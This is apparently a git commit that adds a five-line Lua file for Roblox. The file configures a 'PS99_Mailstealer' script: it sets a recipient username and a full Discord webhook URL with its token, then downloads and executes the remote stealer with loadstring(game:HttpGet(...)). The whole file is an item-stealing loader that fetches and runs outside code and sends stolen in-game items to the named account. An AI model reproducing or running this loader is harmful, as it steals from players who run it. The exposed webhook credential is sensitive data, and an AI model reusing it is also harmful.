e19031af95e5649824663f6e61687fce178aeb9f
BLANKETS3 <kaloykukoy12@gmail.com>
2024-10-21 04:33:34 -0400

    Add files via upload

---
+++ obf_ZzLqsvAySl0H6X1p0l7IYAt0Nwm5495cXM3YwfFNv1CQPt751d25Fb1eaia4sP1l (2).lua
@@ -0,0 +1,5 @@
+Username = "sssrankgamer"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1297819054215663647/7G_9DrrJOip5i24T5WcMNTHHcI0_Hk_Wecn1MsPa62cs2gj-gFoY5nUym6seLmT64dKU" -- Paste your Discord webhook here
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
